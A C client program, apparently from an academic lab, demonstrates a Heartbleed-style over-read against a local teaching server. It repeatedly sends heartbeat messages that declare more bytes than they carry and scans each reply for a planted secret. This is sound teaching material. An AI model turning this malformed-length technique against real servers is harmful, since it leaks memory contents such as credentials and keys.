#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <winsock2.h>
#include <ws2tcpip.h>

#include "common.h"

#pragma comment(lib, "ws2_32.lib")

static int contemSequencia(
    const unsigned char *buffer,
    size_t tamanhoBuffer,
    const char *sequencia
)
{
    size_t tamanhoSequencia = strlen(sequencia);

    if (tamanhoSequencia == 0 || tamanhoSequencia > tamanhoBuffer)
    {
        return 0;
    }

    for (size_t i = 0; i <= tamanhoBuffer - tamanhoSequencia; i++)
    {
        if (
            memcmp(
                buffer + i,
                sequencia,
                tamanhoSequencia
            ) == 0
        )
        {
            return 1;
        }
    }

    return 0;
}

static void imprimirTrechoLegivel(
    const unsigned char *buffer,
    size_t tamanho
)
{
    printf("Conteudo recebido: ");

    for (size_t i = 0; i < tamanho; i++)
    {
        unsigned char caractere = buffer[i];
        putchar(isprint(caractere) ? caractere : '.');
    }

    putchar('\n');
}

int main(void)
{
    WSADATA wsa;
    SOCKET cliente = INVALID_SOCKET;
    struct sockaddr_in enderecoServidor;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Erro ao iniciar Winsock.\n");
        return 1;
    }

    cliente = socket(AF_INET, SOCK_STREAM, 0);

    if (cliente == INVALID_SOCKET)
    {
        printf("Erro ao criar socket.\n");
        WSACleanup();
        return 1;
    }

    memset(&enderecoServidor, 0, sizeof(enderecoServidor));
    enderecoServidor.sin_family = AF_INET;
    enderecoServidor.sin_port = htons(PORTA);
    enderecoServidor.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (
        connect(
            cliente,
            (struct sockaddr *)&enderecoServidor,
            sizeof(enderecoServidor)
        ) == SOCKET_ERROR
    )
    {
        printf("Nao foi possivel conectar ao servidor.\n");
        closesocket(cliente);
        WSACleanup();
        return 1;
    }

    printf("Conectado ao servidor academico.\n");

    const unsigned int maximoTentativas = 100;
    int segredoEncontrado = 0;

    for (
        unsigned int tentativa = 1;
        tentativa <= maximoTentativas && !segredoEncontrado;
        tentativa++
    )
    {
        Mensagem *pedido = (Mensagem *)calloc(1, sizeof(Mensagem));

        if (pedido == NULL)
        {
            printf("Falha ao alocar pedido.\n");
            break;
        }

        const char *payload = "PING";

        pedido->tamanhoReal = (uint32_t)strlen(payload);
        pedido->tamanhoDeclarado = TAMANHO_DECLARADO_ATAQUE;
        memcpy(pedido->dados, payload, pedido->tamanhoReal);

        printf(
            "\nTentativa %u: declarando %u bytes e enviando apenas %u.\n",
            tentativa,
            pedido->tamanhoDeclarado,
            pedido->tamanhoReal
        );

        if (enviarMensagem(cliente, pedido) < 0)
        {
            printf("Erro ao enviar o heartbeat malformado.\n");
            free(pedido);
            break;
        }

        uint32_t tamanhoRespostaRede = 0;

        if (
            receberTudo(
                cliente,
                &tamanhoRespostaRede,
                (int)sizeof(tamanhoRespostaRede)
            ) <= 0
        )
        {
            printf("Conexao encerrada ao receber o tamanho da resposta.\n");
            free(pedido);
            break;
        }

        uint32_t tamanhoResposta = ntohl(tamanhoRespostaRede);

        if (
            tamanhoResposta == 0 ||
            tamanhoResposta > TAM_RESPOSTA_MAX
        )
        {
            printf("Servidor retornou tamanho invalido.\n");
            free(pedido);
            break;
        }

        unsigned char *resposta =
            (unsigned char *)malloc(tamanhoResposta);

        if (resposta == NULL)
        {
            printf("Falha ao alocar a resposta.\n");
            free(pedido);
            break;
        }

        if (
            receberTudo(
                cliente,
                resposta,
                (int)tamanhoResposta
            ) <= 0
        )
        {
            printf("Conexao encerrada durante a resposta.\n");
            free(resposta);
            free(pedido);
            break;
        }

        imprimirTrechoLegivel(resposta, tamanhoResposta);

        segredoEncontrado = contemSequencia(
            resposta,
            tamanhoResposta,
            SEGREDO_ALVO
        );

        if (segredoEncontrado)
        {
            printf("\n=============================================\n");
            printf("SEGREDO ENCONTRADO NO OVER-READ!\n");
            printf("String vazada: %s\n", SEGREDO_ALVO);
            printf("Tentativas necessarias: %u\n", tentativa);
            printf("=============================================\n");
        }
        else
        {
            printf("Segredo ainda nao apareceu; repetindo o ataque.\n");
        }

        free(resposta);
        free(pedido);
    }

    if (!segredoEncontrado)
    {
        printf(
            "O segredo nao apareceu nas %u tentativas configuradas.\n",
            maximoTentativas
        );
    }

    closesocket(cliente);
    WSACleanup();

    return segredoEncontrado ? 0 : 1;
}
